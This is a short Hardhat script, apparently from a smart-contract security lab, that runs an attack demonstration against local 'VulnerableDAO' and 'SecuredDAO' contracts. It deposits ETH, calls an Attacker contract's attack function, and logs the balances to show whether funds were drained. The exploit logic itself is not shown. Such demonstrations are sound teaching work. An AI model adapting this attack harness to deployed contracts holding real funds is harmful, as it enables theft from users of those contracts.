const hre = require("hardhat");

async function main() {
  let contractDao = process.env.ContractDao;
  const contractAttacker = "Attacker";
  if (!contractDao) {
    contractDao = "VulnerableDAO";
  }

  console.log(`Initiating an attack with DAO contract: ${contractDao}`);

  const [deployer, attackerSigner] = await hre.ethers.getSigners();

  // Get contract instances
  const DAO = await hre.ethers.getContractFactory(contractDao);
  const Attacker = await hre.ethers.getContractFactory(contractAttacker);

  // Deployed contract addresses (ensure these match your deployment)
  const daoAddress = 
    // "0x59b670e9fA9D0A427751Af201D676719a970857b"   // VulnerableDAO
    "0x70e0bA845a1A0F2DA3359C97E0285013525FFC49"   // SecuredDAO
    // "0xf5059a5D33d5853360D16C683c16e67980206f36"      // SecuredDAO2
    ;
  const attackerAddress =   
    // "0x4ed7c70F96B99c776995fB64377f0d4aB3B0e1C1"   // VulnerableDAO
    "0x4826533B4897376654Bb4d4AD88B7faFD0C98528"   // SecuredDAO
    // "0x95401dc811bb5740090279Ba06cfA8fcF6113778"      // SecuredDAO2
    ;

  const dao = DAO.attach(daoAddress);
  const attacker = Attacker.attach(attackerAddress);

  // Initial deposit in DAO by the deployer
  console.log("Depositing 2 ETH into DAO by deployer...");
  await dao.connect(deployer).deposit({ value: hre.ethers.parseEther("2.0") });

  // Balance of DAO before the attack
  console.log("DAO balance before attack:", hre.ethers.formatEther(await dao.getBalance()), "ETH");

  // Attacker deposits and starts the attack
  console.log("Attacker initiating attack with 1 ETH...");
  await attacker.connect(attackerSigner).attack({ value: hre.ethers.parseEther("1.0") });

  // Balance of DAO and Attacker after the attack
  console.log("DAO balance after attack:", hre.ethers.formatEther(await dao.getBalance()), "ETH");
  console.log("Attacker balance after attack:", hre.ethers.formatEther(await attacker.getBalance()), "ETH");
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
